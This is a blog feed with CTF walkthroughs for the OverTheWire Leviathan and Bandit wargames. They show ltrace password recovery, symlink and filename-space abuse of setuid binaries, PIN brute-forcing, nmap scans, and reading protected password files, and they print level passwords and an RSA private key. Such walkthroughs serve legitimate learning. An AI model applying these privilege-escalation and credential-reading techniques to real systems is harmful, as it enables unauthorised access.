   0x0804859a &amp;lt;+109&amp;gt;:   movb   $0x0,0x17(%esp)
   0x0804859f &amp;lt;+114&amp;gt;:   lea    0x18(%esp),%eax
   0x080485a3 &amp;lt;+118&amp;gt;:   mov    %eax,0x4(%esp)
   0x080485a7 &amp;lt;+122&amp;gt;:   lea    0x14(%esp),%eax
   0x080485ab &amp;lt;+126&amp;gt;:   mov    %eax,(%esp)
   0x080485ae &amp;lt;+129&amp;gt;:   call   0x80483b0 &amp;lt;strcmp&amp;#64;plt&amp;gt;
   0x080485b3 &amp;lt;+134&amp;gt;:   test   %eax,%eax
   0x080485b5 &amp;lt;+136&amp;gt;:   jne    0x80485c5 &amp;lt;main+152&amp;gt;
   0x080485b7 &amp;lt;+138&amp;gt;:   movl   $0x804868b,(%esp)
   0x080485be &amp;lt;+145&amp;gt;:   call   0x8048400 &amp;lt;system&amp;#64;plt&amp;gt;
   0x080485c3 &amp;lt;+150&amp;gt;:   jmp    0x80485d1 &amp;lt;main+164&amp;gt;
   0x080485c5 &amp;lt;+152&amp;gt;:   movl   $0x8048693,(%esp)
   0x080485cc &amp;lt;+159&amp;gt;:   call   0x80483f0 &amp;lt;puts&amp;#64;plt&amp;gt;
   0x080485d1 &amp;lt;+164&amp;gt;:   mov    $0x0,%eax
   0x080485d6 &amp;lt;+169&amp;gt;:   mov    0x2c(%esp),%edx
   0x080485da &amp;lt;+173&amp;gt;:   xor    %gs:0x14,%edx
   0x080485e1 &amp;lt;+180&amp;gt;:   je     0x80485e8 &amp;lt;main+187&amp;gt;
   0x080485e3 &amp;lt;+182&amp;gt;:   call   0x80483e0 &amp;lt;__stack_chk_fail&amp;#64;plt&amp;gt;
   0x080485e8 &amp;lt;+187&amp;gt;:   leave
   0x080485e9 &amp;lt;+188&amp;gt;:   ret
End of assembler dump.&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So it uses &lt;code&gt;strcmp&lt;/code&gt; to compare our input to whatever the right pass is (&lt;code&gt;0x080485ae&lt;/code&gt;)
I'm going to use &lt;code&gt;ltrace&lt;/code&gt; to trace through the library call and see what that reveals&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan1&amp;#64;melinda:~$&lt;/span&gt; ltrace ./check
&lt;span class="go"&gt;__libc_start_main(0x804852d, 1, 0xffffd794, 0x80485f0 &amp;lt;unfinished ...&amp;gt;
printf(&amp;quot;password: &amp;quot;)                                       = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: test
)               = 116
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 101
getchar(0x8048680, 47, 0x804a000, 0x8048642)               = 115
strcmp(&amp;quot;tes&amp;quot;, &amp;quot;sex&amp;quot;)                                       = 1
puts(&amp;quot;Wrong password, Good Bye ...&amp;quot;Wrong password, Good Bye ...
)                       = 29
+++ exited (status 0) +++&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And there we have it.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan1&amp;#64;melinda:~$&lt;/span&gt; ./check
&lt;span class="go"&gt;password: sex
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;leviathan2
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/leviathan_pass/leviathan2
&lt;span class="go"&gt;ougahZi8Ta&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-2-3"&gt;
&lt;h2&gt;Level 2 -&amp;gt; 3&lt;/h2&gt;
&lt;p&gt;This time we are given a file called &lt;code&gt;printfile&lt;/code&gt; that is setuid &lt;code&gt;leviathan3&lt;/code&gt;.
Initially you'd think we can just print the contents of the &lt;code&gt;leviathan3&lt;/code&gt; password
file. Nope, there's a check in the binary preventing us from doing so.&lt;/p&gt;
&lt;p&gt;Let's find out what that check is with &lt;code&gt;ltrace&lt;/code&gt; once again&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan2&amp;#64;melinda:~$&lt;/span&gt; ltrace ./printfile /tmp/unlogic
&lt;span class="go"&gt;__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &amp;lt;unfinished ...&amp;gt;
access(&amp;quot;/tmp/unlogic&amp;quot;, 4)                                  = 0
snprintf(&amp;quot;/bin/cat /tmp/unlogic&amp;quot;, 511, &amp;quot;/bin/cat %s&amp;quot;, &amp;quot;/tmp/unlogic&amp;quot;) = 21
system(&amp;quot;/bin/cat /tmp/unlogic&amp;quot;testing
 &amp;lt;no return ...&amp;gt;
--- SIGCHLD (Child exited) ---
&amp;lt;... system resumed&amp;gt; )                                     = 0
+++ exited (status 0) +++&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We can see that it checks access to the file, then runs &lt;code&gt;cat&lt;/code&gt; on the file if it's
ok for us to access it. Symlinks won't work here, as the &lt;code&gt;access&lt;/code&gt; call dereferences
the symlink. So what can we do? We exploit spaces. By creating a file that is a symlink to
the &lt;code&gt;leviathan3&lt;/code&gt; password file, along with another file, that has the same name followed
by a space and another name, we can trick &lt;code&gt;access&lt;/code&gt; into allowing it to carry on, and
then &lt;code&gt;cat&lt;/code&gt; to print the files. let me show you&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan2&amp;#64;melinda:~$&lt;/span&gt; ln -s /etc/leviathan_pass/leviathan3 /tmp/levpass3
&lt;span class="gp"&gt;leviathan2&amp;#64;melinda:~$&lt;/span&gt; touch /tmp/levpass3&lt;span class="se"&gt;\ &lt;/span&gt;other
&lt;span class="gp"&gt;leviathan2&amp;#64;melinda:~$&lt;/span&gt; ./printfile /tmp/levpass3&lt;span class="se"&gt;\ &lt;/span&gt;other
&lt;span class="go"&gt;Ahdiemoo1j
/bin/cat: other: No such file or directory&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So access checks &lt;code&gt;/tmp/levpass3\ other&lt;/code&gt; and deems it ok. Then that string gets
passed to &lt;code&gt;cat&lt;/code&gt; which interprets it as two files, hence the &lt;code&gt;/bin/cat: other: No such file or directory&lt;/code&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-3-4"&gt;
&lt;h2&gt;Level 3 -&amp;gt; 4&lt;/h2&gt;
&lt;p&gt;Another program that prompts for a pass. Usual approaches of &lt;code&gt;strings&lt;/code&gt; and checking
the &lt;em&gt;disass&lt;/em&gt; doesn't reveal much, but the function &lt;code&gt;do_stuff&lt;/code&gt; does call &lt;code&gt;strcmp&lt;/code&gt;
and we know now that we can use &lt;code&gt;ltrace&lt;/code&gt; to help us out&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan3&amp;#64;melinda:~$&lt;/span&gt; ltrace ./level3
&lt;span class="go"&gt;__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &amp;lt;unfinished ...&amp;gt;
strcmp(&amp;quot;h0no33&amp;quot;, &amp;quot;kakaka&amp;quot;)                                 = -1
printf(&amp;quot;Enter the password&amp;gt; &amp;quot;)                             = 20
fgets(Enter the password&amp;gt; d
&amp;quot;d\n&amp;quot;, 256, 0xf7fcac20)                              = 0xffffd58c
strcmp(&amp;quot;d\n&amp;quot;, &amp;quot;snlprintf\n&amp;quot;)                               = -1
puts(&amp;quot;bzzzzzzzzap. WRONG&amp;quot;bzzzzzzzzap. WRONG
)                                 = 19
+++ exited (status 0) +++&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;A little bit of obfuscation here, but to our keen eyes, we see where the test
is happening &lt;code&gt;strcmp(&amp;quot;d\n&amp;quot;, &amp;quot;snlprintf\n&amp;quot;)&lt;/code&gt;. Our password is &lt;code&gt;snlprintf&lt;/code&gt;.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan3&amp;#64;melinda:~$&lt;/span&gt; ./level3
&lt;span class="go"&gt;Enter the password&amp;gt; snlprintf
[You've got shell]!
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;leviathan4
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/leviathan_pass/leviathan4
&lt;span class="go"&gt;vuH0coox6m&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-4-5"&gt;
&lt;h2&gt;Level 4 -&amp;gt; 5&lt;/h2&gt;
&lt;p&gt;Inside the hidden directory (you always run &lt;code&gt;ls -la&lt;/code&gt;, right?) we have a bin file.
It's executable, so let's run it&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan4&amp;#64;melinda:~$&lt;/span&gt; ./.trash/bin
&lt;span class="go"&gt;01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I'm guessing we need to decode that from the current binary encoded string to text. This
gives us &lt;code&gt;Tith4cokei&lt;/code&gt;. Testing it out takes us to&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-5-6"&gt;
&lt;h2&gt;Level 5 -&amp;gt; 6&lt;/h2&gt;
&lt;p&gt;We have a binary called &lt;code&gt;leviathan5&lt;/code&gt; that is suid &lt;code&gt;leviathan6&lt;/code&gt;. Upon running it,
we get a message that file &lt;code&gt;tmp/file.log&lt;/code&gt; cannot be found. If you create one, it
will open it, print its contents, close it, and then delete it. So let's give the
old symlink method a try:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan5&amp;#64;melinda:~$&lt;/span&gt; ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
&lt;span class="gp"&gt;leviathan5&amp;#64;melinda:~$&lt;/span&gt; ./leviathan5
&lt;span class="go"&gt;UgaoFee4li&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Result.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-6-7"&gt;
&lt;h2&gt;Level 6 -&amp;gt; 7&lt;/h2&gt;
&lt;p&gt;We need a 4 digit pass code to access this. I opted for brute force. For 4 digits
that's by far the simplest and quickest way. After looking at the disassembly, we
see that it will call &lt;code&gt;/bin/sh&lt;/code&gt; and drop us to a shell, so we don't need an exit condition.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan6&amp;#64;melinda:~$&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; i in &lt;span class="k"&gt;$(&lt;/span&gt;seq -f &lt;span class="s2"&gt;&amp;quot;%04g&amp;quot;&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; 9999&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ./leviathan6 &lt;span class="nv"&gt;$i&lt;/span&gt; &amp;gt; /dev/null&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="go"&gt;0000
0001
.
.
7123&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;It stops there. Because we redirect to /dev/null, we need to ctrl+c and then enter
the last printed number to get the password&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;leviathan6&amp;#64;melinda:~$&lt;/span&gt; ./leviathan6  7123
&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/leviathan_pass/leviathan7
&lt;span class="go"&gt;ahy7MaeBo9&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The final flag for level 7 is&lt;/p&gt;
&lt;blockquote&gt;
Well Done, you seem to have used a * nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)&lt;/blockquote&gt;
&lt;p&gt;I understand the reasons, but this is not the only write up out there, and it is a fairly old
wargame too. IMO I feel that providing these walkthroughs will help those who are stuck.
If you are however just following this so that you can complete Leviathan, then you should
sit down and have a go at this, or other war games without a guide. Challenge yourself.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Dominos CLI Update</title><link href="http://unlogic.co.uk/2015/03/15/dominos-cli-update/" rel="alternate"></link><updated>2015-03-15T06:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-03-15:2015/03/15/dominos-cli-update/</id><summary type="html">&lt;p&gt;Small update on some progress and changes. Setting the store is now done by
enetering your postcode and the nearest delivery store to that postcode is
automatically selected. Setting the address also works and isn't just a stub,
and finally it is also able to determine if cash on delivery is available to you,
albeit at the end of the process, but that's how they do it.&lt;/p&gt;
&lt;script type="text/javascript" src="https://asciinema.org/a/17706.js" id="asciicast-17706" async&gt;&lt;/script&gt;&lt;p&gt;So the API is coming along and the CLI interface (which is mostly just a proof
of concept for the API) is also shaping up. Once cash on delivery orders are working
I reckon it's time to release it. Then work on investigating how credit card orders
are handled will start.&lt;/p&gt;
&lt;p&gt;It's a fun, fairly pointless, and interesting ride :)&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://github.com/Svenito/dominos"&gt;Now on Github&lt;/a&gt;&lt;/p&gt;
</summary><category term="[]"></category></entry><entry><title>Let's crack Bandit Part 2</title><link href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part-2/" rel="alternate"></link><updated>2015-03-13T21:10:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-03-13:2015/03/13/lets-crack-bandit-part-2/</id><summary type="html">&lt;p&gt;Continues on from &lt;a class="reference external" href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part1"&gt;Let's crack Bandit Part 1&lt;/a&gt;&lt;/p&gt;
&lt;div class="section" id="level-15-16"&gt;
&lt;h2&gt;Level 15 -&amp;gt; 16&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit16.html"&gt;Level 15&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Eventhough this is very similar to the previous level, it's a little
more complicated as we need to connect with SSL.
The simplest way is using &lt;code&gt;openssl&lt;/code&gt; with &lt;code&gt;s_client&lt;/code&gt;. Once connected it's the
same dance as above&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit15&amp;#64;melinda:~$&lt;/span&gt; openssl s_client -quiet -connect localhost:30001
&lt;span class="go"&gt;depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

read:errno=0&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-16-17"&gt;
&lt;h2&gt;Level 16 -&amp;gt; 17&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit17.html"&gt;Level 16&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Here we have a choice. We run a simple ping scan across the port range and then
figure out which port is the right one by trying each one. Depending on the number
of ports open this could take a while or not.
Let's see how we're going to handle this by seeing which ports are open&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit16&amp;#64;melinda:~$&lt;/span&gt; nmap localhost -p 31000-32000
&lt;span class="go"&gt;
Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:54 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00080s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Not too bad. Because it's a short list, we can try them one by one, or
we run a service discovery on them. Service discovery in nmap takes a while,
so I only scan the ports we are interseted in:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit16&amp;#64;melinda:~$&lt;/span&gt; nmap -sV -p 31046,31518,31691,31790,31960 localhost
&lt;span class="go"&gt;
Starting Nmap 6.40 ( http://nmap.org ) at 2015-03-20 14:51 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00015s latency).
PORT      STATE SERVICE VERSION
31046/tcp open  echo
31518/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31691/tcp open  echo
31790/tcp open  msdtc   Microsoft Distributed Transaction Coordinator (error)
31960/tcp open  echo
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Now we only have two ports to try, as the others are clearly just echo ports.
Eliminating one we go ahead and&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit16&amp;#64;melinda:~$&lt;/span&gt; openssl s_client -quiet -connect localhost:31790
&lt;span class="go"&gt;depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

read:errno=0&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Now copy that key into a new file and use &lt;code&gt;chmod go-rw key&lt;/code&gt; to remove group
and other read/write. ssh refuses to accept a key that is read/write by
anyone other than the user who owns the file. Then simply&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit16&amp;#64;melinda:~$&lt;/span&gt; ssh -i /tmp/k.key bandit17&amp;#64;localhost
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-17-18"&gt;
&lt;h2&gt;Level 17 -&amp;gt; 18&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit18.html"&gt;Level 17&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We remain logged in as bandit17 from the previous level. To compare two files
we need to do a &lt;code&gt;diff&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit17&amp;#64;melinda:~$&lt;/span&gt; diff passwords.old  passwords.new
&lt;span class="go"&gt;42c42
&amp;lt; BS8bqB1kqkinKJjuxL6k072Qq9NRwQpR&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
</summary></entry><entry><title>Let's crack Bandit Part 1</title><link href="http://unlogic.co.uk/2015/03/13/lets-crack-bandit-part-1/" rel="alternate"></link><updated>2015-03-13T21:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-03-13:2015/03/13/lets-crack-bandit-part-1/</id><summary type="html">&lt;p&gt;Let's give Bandit from the &lt;a class="reference external" href="http://overthewire.org/wargames"&gt;overthewire war games&lt;/a&gt;
a going over. I did this a while back, but never really wrote it up,
so I'm going to do it again and write it up. Remember that you can copy
and paste from all the &lt;a class="reference external" href="https://asciinema.org"&gt;asciinema&lt;/a&gt; videos below.&lt;/p&gt;
&lt;p&gt;Bandit is a CTF/wargame for beginners and a great intro to various
linux tools as well. I won't repeat the level summary for each post, instead
there's a link to the original page for each section.&lt;/p&gt;
&lt;p&gt;I'd be interested to know if the asciinema files are preferable over the
plain text format or not. Let me know in the comments below. I've used
asciinema in the first level only, but would post the asciinema vids if they
are useful.&lt;/p&gt;
&lt;div class="section" id="level-0-1"&gt;
&lt;h2&gt;Level 0 -&amp;gt; 1&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit1.html"&gt;level 00&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Not much to do here but login and read a file so:&lt;/p&gt;
&lt;script type="text/javascript" src="https://asciinema.org/a/17664.js" id="asciicast-17664" async&gt;&lt;/script&gt;&lt;/div&gt;
&lt;div class="section" id="level-1-2"&gt;
&lt;h2&gt;Level 1 -&amp;gt; 2&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit2.html"&gt;level 01&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Using the password from the last session, let's login and look at what's in
&lt;code&gt;-&lt;/code&gt;. The trick here is that &lt;cite&gt;:code:&lt;/cite&gt;-` is a bit tricky to pass as an argument. Try
it to see what happens. All we need to do it prefix it with the path:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit1&amp;#64;melinda:~$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 24
-rw-r-----   1 bandit2 bandit1   33 Jun  6  2013 -
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
&lt;/span&gt;&lt;span class="gp"&gt;bandit1&amp;#64;melinda:~$&lt;/span&gt; cat ./-
&lt;span class="go"&gt;CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-2-3"&gt;
&lt;h2&gt;Level 2 -&amp;gt; 3&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit3.html"&gt;level 02&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Not much trickiness here, merely the spaces in the filename. But with TAB
completion the escaping of the spaces will be handled for us:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit2&amp;#64;melinda:~$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 24
drwxr-xr-x   2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 160 root    root    4096 Oct 17  2013 ..
-rw-r--r--   1 root    root     220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root    root    3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root    root     675 Apr  3  2012 .profile
-rw-r-----   1 bandit3 bandit2   33 Jun  6  2013 spaces in this filename
&lt;/span&gt;&lt;span class="gp"&gt;bandit2&amp;#64;melinda:~$&lt;/span&gt; cat ./spaces&lt;span class="se"&gt;\ &lt;/span&gt;in&lt;span class="se"&gt;\ &lt;/span&gt;this&lt;span class="se"&gt;\ &lt;/span&gt;filename
&lt;span class="go"&gt;UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-3-4"&gt;
&lt;h2&gt;Level 3 -&amp;gt; 4&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit4.html"&gt;level 03&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Hidden file? Just do a long listing with &lt;code&gt;ls -la&lt;/code&gt;&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit3&amp;#64;melinda:~$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 24
drwxr-xr-x   3 root root 4096 Jun  6  2013 .
drwxr-xr-x 160 root root 4096 Oct 17  2013 ..
-rw-r--r--   1 root root  220 Apr  3  2012 .bash_logout
-rw-r--r--   1 root root 3486 Apr  3  2012 .bashrc
-rw-r--r--   1 root root  675 Apr  3  2012 .profile
drwxr-xr-x   2 root root 4096 Jun  6  2013 inhere
&lt;/span&gt;&lt;span class="gp"&gt;bandit3&amp;#64;melinda:~$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; inhere/
&lt;span class="gp"&gt;bandit3&amp;#64;melinda:~/inhere$&lt;/span&gt; ls
&lt;span class="gp"&gt;bandit3&amp;#64;melinda:~/inhere$&lt;/span&gt; ls -la
&lt;span class="go"&gt;total 12
drwxr-xr-x 2 root    root    4096 Jun  6  2013 .
drwxr-xr-x 3 root    root    4096 Jun  6  2013 ..
-rw-r----- 1 bandit4 bandit3   33 Jun  6  2013 .hidden
&lt;/span&gt;&lt;span class="gp"&gt;bandit3&amp;#64;melinda:~/inhere$&lt;/span&gt; cat .hidden
&lt;span class="go"&gt;pIwrPrtPN36QITSp3EQaw936yaFoFgAB&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-4-5"&gt;
&lt;h2&gt;Level 4 -&amp;gt; 5&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://overthewire.org/wargames/bandit/bandit5.html"&gt;level 04&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We need to find a human readable file in the &lt;code&gt;inhere&lt;/code&gt; directory. Using the
power of bash:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;bandit4&amp;#64;melinda:~$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; inhere/
&lt;span class="gp"&gt;bandit4&amp;#64;melinda:~/inhere$&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; f in &lt;span class="k"&gt;$(&lt;/span&gt;ls&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; file ./&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;f&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="go"&gt;./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
&lt;/span&gt;&lt;span class="gp"&gt;bandit4&amp;#64;melinda:~/inhere$&lt;/span&gt; cat ./-file07
&lt;span class="go"&gt;koReBOKuIDDepwhWk7jZC0RTdopnAYKh&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Change into the &lt;code&gt;inhere&lt;/code&gt; directory and then for each file returned by the &lt;code&gt;ls&lt;/code&gt;
command, get the filetype with the &lt;code&gt;file&lt;/code&gt; command. Only one which is ASCII, so
that's a good candidate. Sure enough, it's the one we are after.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-5-6"&gt;
&lt;h2&gt;Level 5 -&amp;gt; 6&lt;/h2&gt;
